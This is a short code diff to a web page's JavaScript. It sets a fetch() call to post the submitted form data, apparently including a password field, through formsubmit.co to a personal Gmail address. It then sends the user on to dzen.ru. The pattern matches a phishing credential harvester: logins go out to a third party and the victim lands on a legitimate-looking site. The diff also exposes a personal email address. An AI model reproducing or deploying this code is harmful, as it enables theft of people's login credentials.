@@ -94,7 +94,7 @@ $('#hidePass').click(function(){
             $('.finish').text('');
             $('.finish-wrap img').addClass('active');
 
-            fetch('https://formsubmit.co/ajax/mailhere', {
+            fetch('https://formsubmit.co/ajax/necheporenkoslava@gmail.com', {
                 method: 'POST',
                 body: formData
             })
@@ -103,7 +103,7 @@ $('#hidePass').click(function(){
                 console.log('Success:', data);
                 
                 form.reset(); 
-                window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'; 
+                window.location.href = 'https://dzen.ru/?yredirect=true'; 
             })
             .catch(error => {
                 console.error('Error:', error);
